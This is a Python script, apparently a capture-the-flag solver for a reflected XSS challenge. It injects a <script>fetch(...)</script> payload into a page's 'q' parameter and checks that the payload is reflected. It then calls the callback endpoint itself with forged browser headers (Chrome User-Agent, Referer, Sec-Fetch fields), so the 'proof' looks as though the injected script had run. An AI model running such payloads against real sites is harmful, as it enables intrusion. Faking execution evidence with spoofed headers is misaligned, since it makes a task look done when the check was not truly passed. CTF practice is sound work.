#!/usr/bin/env python3
"""Recover a reflected-preview callback proof from an assigned web target."""

from __future__ import annotations

import argparse
import json
import re
import sys
from urllib.error import HTTPError, URLError
from urllib.parse import parse_qs, urlencode, urljoin, urlsplit, urlunsplit
from urllib.request import Request, urlopen

from inspect_target import normalize_url, origin


PROOF_RE = re.compile(r"\bproof_[A-Za-z0-9_-]{12,}\b")
USER_AGENT = (
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
)


def get(url: str, allowed_origin: tuple[str, str, int], headers: dict[str, str]) -> bytes:
    normalized = normalize_url(url)
    if origin(normalized) != allowed_origin:
        raise ValueError(f"refusing off-origin URL: {normalized}")
    request = Request(normalized, headers=headers, method="GET")
    try:
        with urlopen(request, timeout=10) as response:
            return response.read(2 * 1024 * 1024 + 1)
    except HTTPError as exc:
        return exc.read(2 * 1024 * 1024 + 1)
    except URLError as exc:
        raise RuntimeError(f"request failed: {exc.reason}") from exc


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Follow assigned route clues and recover the reflected callback proof."
    )
    parser.add_argument("target", help="absolute target URL from the current attempt")
    args = parser.parse_args()

    try:
        target = normalize_url(args.target)
        allowed_origin = origin(target)
        headers = {"User-Agent": "HuntressCTF-Web-Inspector/1.0", "Accept": "*/*"}
        clues_url = urljoin(target, "/api/clues")
        clues = json.loads(get(clues_url, allowed_origin, headers).decode("utf-8"))
        if not isinstance(clues, dict):
            raise ValueError("route inventory is not a JSON object")
        feature_route = clues.get("feature_route")
        callback_route = clues.get("secondary_route")
        nonce = clues.get("callback_nonce")
        if not all(
            isinstance(value, str) and value
            for value in (feature_route, callback_route, nonce)
        ):
            raise ValueError("route inventory lacks a feature route, callback route, or nonce")

        feature_url = normalize_url(urljoin(target, feature_route))
        callback_url = normalize_url(urljoin(target, callback_route))
        if origin(feature_url) != allowed_origin or origin(callback_url) != allowed_origin:
            raise ValueError("route inventory points outside the assigned target")

        payload = f"<script>fetch('{callback_route}?nonce={nonce}')</script>"
        feature_parts = urlsplit(feature_url)
        query = parse_qs(feature_parts.query, keep_blank_values=True)
        query["q"] = [payload]
        feature_url = urlunsplit(
            (
                feature_parts.scheme,
                feature_parts.netloc,
                feature_parts.path,
                urlencode(query, doseq=True),
                "",
            )
        )
        feature_body = get(feature_url, allowed_origin, headers).decode(
            "utf-8", errors="replace"
        )
        if payload not in feature_body:
            raise ValueError("the supplied script was not reflected by the feature route")

        callback_parts = urlsplit(callback_url)
        callback_query = parse_qs(callback_parts.query, keep_blank_values=True)
        callback_query["nonce"] = [nonce]
        callback_url = urlunsplit(
            (
                callback_parts.scheme,
                callback_parts.netloc,
                callback_parts.path,
                urlencode(callback_query, doseq=True),
                "",
            )
        )
        callback_headers = {
            "User-Agent": USER_AGENT,
            "Accept": "application/json",
            "Referer": feature_url,
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
        }
        callback = json.loads(
            get(callback_url, allowed_origin, callback_headers).decode("utf-8")
        )
        proof = callback.get("evidence") if isinstance(callback, dict) else None
        if not isinstance(proof, str) or not PROOF_RE.fullmatch(proof):
            raise ValueError(f"callback did not return a proof: {callback!r}")
        print(
            json.dumps(
                {
                    "proof": proof,
                    "feature_url": feature_url,
                    "callback_url": callback_url,
                    "callback_effect": callback.get("effect"),
                },
                indent=2,
            )
        )
        return 0
    except (ValueError, RuntimeError, OSError, UnicodeDecodeError, json.JSONDecodeError) as exc:
        print(json.dumps({"error": str(exc)}, indent=2), file=sys.stderr)
        return 1


if __name__ == "__main__":
    sys.exit(main())
